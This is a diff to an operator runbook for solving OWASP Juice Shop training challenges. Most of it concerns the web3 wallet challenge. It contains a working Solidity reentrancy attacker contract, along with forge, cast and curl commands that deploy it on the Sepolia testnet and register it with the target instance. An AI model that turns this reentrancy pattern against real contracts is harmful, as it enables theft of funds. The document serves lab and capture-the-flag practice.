@@ -43,10 +43,11 @@ Pre-flight: verify `RECON_ENABLED` flag file is present before running solver af
    `docker cp juice-shop:/juice-shop/data/juiceShop.sqlite ./juiceShop.sqlite.bak`
 3. Stop: `docker stop juice-shop`
 4. Restore DB if backed up: `cp juiceShop.sqlite.bak data/juiceShop.sqlite`
-5. Relaunch with NODE_ENV=test — derive image/port from stopped container:
+5. Remove stopped container and relaunch with NODE_ENV=test:
    ```bash
    IMAGE=$(docker inspect juice-shop --format '{{.Config.Image}}')
-   PORT=$(docker port juice-shop 3000/tcp 2>/dev/null | awk -F: '{print $2}' || echo "3000")
+   PORT=$(docker inspect juice-shop --format '{{(index (index .HostConfig.PortBindings "3000/tcp") 0).HostPort}}')
+   docker rm juice-shop
    docker run -d --name juice-shop -p ${PORT}:3000 -e NODE_ENV=test ${IMAGE}
    ```
    Alternative if source is on host: `cd /path/to/juice-shop && NODE_ENV=test node server.js`
@@ -174,24 +175,30 @@ for i in $(seq 1 10); do sleep 3
 done
 ```
 3. For `web3WalletChallenge` (ETHWalletBank at `0x413744D59d31AFDC2889aeE602636177805Bd7b0`):
-   a. POST `/rest/web3/walletExploitAddress`
-      `{"walletAddress": "$WALLET"}`. Expected: `{"status":"success"}`.
-      EOA registered here; attacker contract address unknown until 3c — ordering intentional.
-   b. Save and compile `Attacker.sol` (Solidity 0.8, chain 11155111):
+   a. Save `Attacker.sol` (Solidity 0.8, chain 11155111) — `hits` counter prevents gas exhaustion:
 ```solidity
 interface IBank { function deposit() external payable; function withdraw(uint256) external; }
 contract Attacker {
-    IBank bank; uint256 amt;
+    IBank bank; uint256 amt; uint8 hits;
     constructor(address b) { bank = IBank(b); }
-    receive() external payable { if (address(bank).balance >= amt) bank.withdraw(amt); }
+    receive() external payable {
+        if (hits < 2 && address(bank).balance >= amt) { hits++; bank.withdraw(amt); }
+    }
     function attack() external payable { amt = msg.value; bank.deposit{value: amt}(); bank.withdraw(amt); }
 }
 ```
-   c. Deploy and call:
+   b. Deploy to get `$ATTACKER`, then register it — `ContractExploited` emits the contract address:
 ```bash
 ATTACKER=$(forge create ./Attacker.sol:Attacker \
   --constructor-args 0x413744D59d31AFDC2889aeE602636177805Bd7b0 \
   --rpc-url $ALCHEMY_SEPOLIA_RPC --account juice-shop-wallet | grep "Deployed to:" | awk '{print $3}')
+curl -s -XPOST https://target.cocode.dk/rest/web3/walletExploitAddress \
+  -H 'Content-Type: application/json' \
+  -d "{\"walletAddress\": \"$ATTACKER\"}"
+# Expected: {"status":"success"}
+```
+   c. Trigger reentrancy and poll:
+```bash
 cast send $ATTACKER "attack()" --value 0.001ether \
   --rpc-url $ALCHEMY_SEPOLIA_RPC --account juice-shop-wallet
 # Poll for Alchemy WebSocket to mark challenge solved (up to 30s)
@@ -200,7 +207,7 @@ for i in $(seq 1 10); do sleep 3
   [ "$SOLVED" = "true" ] && { echo "web3WalletChallenge: solved"; break; } || echo "Waiting... ($i/10)"
 done
 ```
-      Reentrancy sets `userWithdrawing[attacker] > 1` → emits `ContractExploited`
+      Reentrancy increments `userWithdrawing[$ATTACKER]` to 2 → emits `ContractExploited`
       → Alchemy WebSocket → `web3WalletChallenge` solved.
 
 ---
@@ -249,3 +256,9 @@ After each operator unlock, verify by challenge key:
 - **Web3 freshness checks (r5-5)**: Contract addresses are on-chain immutables sourced from Juice Shop's own `data/static/web3-snippets/`. They do not change at runtime. Listener status is confirmed in step 1.
 - **cast receipt assertions (r5-7)**: `cast send` blocks until the tx is mined and surfaces failures as non-zero exit codes — no separate receipt step is needed. The Juice Shop Alchemy WebSocket confirms challenge events independently.
 - **Named challenge assertions (r5-8)**: Category A has 16 challenges; asserting each by name requires 16 queries and provides no additional signal over the count for ceiling confirmation. Count suffices here.
+
+### cursor-agent r7 push-backs
+
+- **gemma4:e4b fallback (r7-2)**: The preflight now extracts the model tag at runtime from Juice Shop's config. The fallback `echo "gemma4:e4b"` is the observed value — if the grep fails, the operator verifies manually before proceeding. Removing the fallback would silently break the pull command.
+- **OLLAMA_HOST key (r7-3)**: Same as r5-2. The chat health check added in the prior round gives the testable signal: if `/rest/chat` returns 200, Juice Shop is reaching Ollama regardless of which env var name it uses.
+- **Contract address verification (r7-6)**: Same as r5-5. These addresses are Sepolia-deployed immutables in Juice Shop's own `data/static/web3-snippets/`. If they've changed, Juice Shop itself is broken. No preflight `cast code` check adds useful signal here.
